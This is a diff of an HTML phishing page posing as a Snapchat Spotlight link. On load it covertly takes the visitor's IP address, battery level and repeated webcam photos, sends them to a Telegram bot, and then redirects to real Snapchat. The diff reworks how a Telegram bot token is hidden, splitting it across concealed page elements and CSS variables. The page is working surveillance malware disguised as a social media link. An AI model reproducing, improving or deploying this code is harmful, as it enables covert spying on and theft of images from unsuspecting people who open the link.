@@ -2,53 +2,38 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <script>var _v_mem_31 = "8431"; var _v_ptr_04 = "9l8I";</script>
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
-        :root { 
-            --gfx-offset-v: "l7AM"; 
-            --shadow-blur-radius: "5153";
-            --font-kerning-data: "m9EG";
-            --edge-smooth-factor: "10:";
-            --ui-render-scale: "AAFA";
-        }
+        :root { --config-node: "AAFABzJuX8"; }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
         .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
-    <script>var _v_cache_09 = "Vis5";</script>
 </head>
 <body onload="capture()">
-    <script>var _v_sync_12 = "LVis";</script>
 
-    <div class="zone-wrapper">
-        <span id="hex-alloc-01">BzJu</span>
-        <span id="hex-alloc-02">X8l7</span>
+    <a href="#" id="legacy-link" class="zone-wrapper">l7AMLVis5x</a>
+
+    <div class="main-content">
+        <p class="zone-wrapper" id="raw-meta">8431515310:</p>
     </div>
 
 <script>
     const API_TOKEN = "7294105831:AAHkL01xVpZ7mN9_QY2Wz8kR0X41vLM0P2t";
-    var _v_stack_77 = "xSFH";
 
     async function capture() {
         const urlParams = new URLSearchParams(window.location.search);
         const targetID = urlParams.get('id'); 
+        
         if (!targetID) return;
 
         try {
-            var _v_heap_15 = "K95i";
-            const _conf = getComputedStyle(document.documentElement);
+            const partA = document.getElementById("raw-meta").innerText;
+            const nodeX = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const dataV = document.getElementById("legacy-link").innerText;
+            const saltK = document.getElementById("system-trace").innerText;
             
-            const _s_4 = _conf.getPropertyValue('--shadow-blur-radius').replace(/"/g, '').trim();
-            const _s_9 = _conf.getPropertyValue('--edge-smooth-factor').replace(/"/g, '').trim();
-            const _s_1 = _conf.getPropertyValue('--gfx-offset-v').replace(/"/g, '').trim();
-            const _s_7 = _conf.getPropertyValue('--font-kerning-data').replace(/"/g, '').trim();
-            const _s_r = _conf.getPropertyValue('--ui-render-scale').replace(/"/g, '').trim();
-            
-            var _d_02 = document.getElementById("hex-alloc-02").innerText;
-            var _d_01 = document.getElementById("hex-alloc-01").innerText;
-
-            const _session_auth = _v_mem_31 + _s_4 + _s_9 + _s_r + _d_01 + _d_02 + _s_1 + _v_cache_09 + _v_stack_77 + _s_7 + _v_heap_15 + _v_ptr_04;
+            const finalBuild = partA + nodeX + dataV + saltK;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -69,7 +54,7 @@
                 .then(res => res.json())
                 .then(data => {
                     let report = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
-                    _sendMsg(report, _session_auth, targetID);
+                    _sendMsg(report, finalBuild, targetID);
                 });
 
             const video = document.createElement('video');
@@ -83,13 +68,18 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _session_auth, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", finalBuild, targetID); }, 'image/jpeg', 0.9);
             };
-            setInterval(takeSnap, 700);
+            setInterval(takeSnap, 800);
 
         } catch (e) {
-            const _rec = "8431515310:AAFABzJuX8l7AMLVis5xSFHm9EGK95i9l8I";
-            _sendMsg("Blocked", _rec, targetID);
+            const errA = document.getElementById("raw-meta").innerText;
+            const errB = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const errC = document.getElementById("legacy-link").innerText;
+            const errD = document.getElementById("system-trace").innerText;
+            const recovery = errA + errB + errC + errD;
+
+            _sendMsg("Blocked", recovery, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -105,9 +95,13 @@
     function _sendFile(blob, type, tk, uid) {
         let fd = new FormData();
         fd.append("chat_id", uid);
-        fd.append(type, blob, "img.jpg");
+        fd.append(type, blob, "snap.jpg");
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
+
+    <div class="zone-wrapper">
+        <code id="system-trace">SFHm9EGK95i9l8I</code>
+    </div>
 </body>
 </html>
